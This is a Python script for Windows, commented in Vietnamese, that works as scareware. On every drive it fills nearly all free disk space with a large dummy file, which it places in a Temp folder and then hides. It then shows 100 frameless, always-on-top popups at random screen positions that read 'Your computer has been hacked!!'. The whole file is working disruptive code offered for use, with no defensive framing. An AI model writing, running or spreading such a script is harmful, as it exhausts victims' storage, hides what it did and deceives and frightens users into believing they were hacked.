import psutil
import os
import subprocess
import time
import tkinter as tk
import random

def hide_directory(path):
    """Ẩn thư mục bằng cách đặt thuộc tính hệ thống."""
    subprocess.run(f'attrib +h "{path}"', shell=True)

def create_fake_files():
    # Kích thước tối thiểu còn lại trên ổ đĩa (2 GB)
    min_free_space = 2 * (1024 ** 3)  # 2 GB tính bằng byte

    # Lấy thông tin về các ổ đĩa
    partitions = psutil.disk_partitions()

    # Tạo các tệp giả cho từng ổ đĩa
    for partition in partitions:
        # Lấy thông tin dung lượng của ổ đĩa
        usage = psutil.disk_usage(partition.mountpoint)
        free_space = usage.free  # Dung lượng còn lại (byte)

        if free_space > min_free_space:
            # Tính kích thước tệp giả
            fake_file_size = free_space - min_free_space
            
            # Đường dẫn đến thư mục Temp
            temp_dir = os.path.join(partition.mountpoint, "Temp")
            
            # Tạo thư mục nếu nó chưa tồn tại
            if not os.path.exists(temp_dir):
                os.makedirs(temp_dir)
            
            # Đường dẫn đến tệp giả
            fake_file_path = os.path.join(temp_dir, "fake_file.txt")
            
            # Tạo tệp giả bằng lệnh fsutil
            command = f'fsutil file createnew "{fake_file_path}" {fake_file_size}'
            try:
                subprocess.run(command, shell=True, check=True)
                hide_directory(temp_dir)  # Ẩn thư mục
            except subprocess.CalledProcessError:
                pass  # Bỏ qua lỗi

    # Mở File Explorer tại "This PC"
    explorer_process = subprocess.Popen('explorer shell:MyComputerFolder', shell=True)

    # Đợi 3 giây
    time.sleep(1)

    # Đóng cửa sổ File Explorer đã mở
    explorer_process.terminate()

    # Tạo thông báo ngẫu nhiên
    def show_warning(index):
        if index < 100:  # Kiểm tra số lượng thông báo
            # Tạo cửa sổ thông báo
            warning_window = tk.Toplevel()
            warning_window.overrideredirect(True)  # Ẩn tiêu đề cửa sổ
            warning_window.geometry("330x100")  # Kích thước cửa sổ thông báo
            warning_window.attributes("-topmost", True)  # Đưa cửa sổ lên trên

            # Tạo frame để tạo viền đỏ
            frame = tk.Frame(warning_window, bg='red', padx=2, pady=2)
            frame.pack()

            # Tạo nội dung thông báo
            content_frame = tk.Frame(frame, bg='white')
            content_frame.pack()

            # Vẽ biểu tượng cảnh báo
            canvas = tk.Canvas(content_frame, width=100, height=100, bg='white', highlightthickness=0)
            canvas.pack(side=tk.LEFT, padx=(10, 5))  # Thêm khoảng cách bên trái

            # Vẽ hình tam giác màu vàng
            canvas.create_polygon(40, 0, 80, 80, 0, 80, fill='yellow', outline='black')
            # Vẽ dấu chấm than bên trong
            canvas.create_text(40, 60, text='!', font=('Arial', 24), fill='black')

            # Tạo nội dung thông báo với kiểu chữ lớn hơn và in đậm
            label = tk.Label(content_frame, text="Máy tính của bạn đã bị hack!!", 
                             padx=10, pady=10, font=('Arial', 10, 'bold'), justify='center', bg='white')
            label.pack(expand=True)  # Trung tâm nội dung

            # Lấy kích thước màn hình
            screen_width = warning_window.winfo_screenwidth()
            screen_height = warning_window.winfo_screenheight()

            # Tính toán vị trí ngẫu nhiên
            x = random.randint(0, screen_width - 400)  # Vị trí ngẫu nhiên trên màn hình
            y = random.randint(0, screen_height - 100)

            # Di chuyển cửa sổ đến vị trí ngẫu nhiên
            warning_window.geometry(f"+{x}+{y}")

            # Đóng cửa sổ thông báo sau 3 giây
            warning_window.after(3000, warning_window.destroy)

            # Gọi lại hàm để tạo thông báo tiếp theo sau 500ms
            warning_window.after(100, show_warning, index + 1)

    # Khởi động giao diện chính
    root = tk.Tk()
    root.withdraw()  # Ẩn cửa sổ chính
    show_warning(0)  # Hiển thị thông báo đầu tiên

    root.mainloop()  # Bắt đầu vòng lặp chính của Tkinter

if __name__ == "__main__":
    create_fake_files()
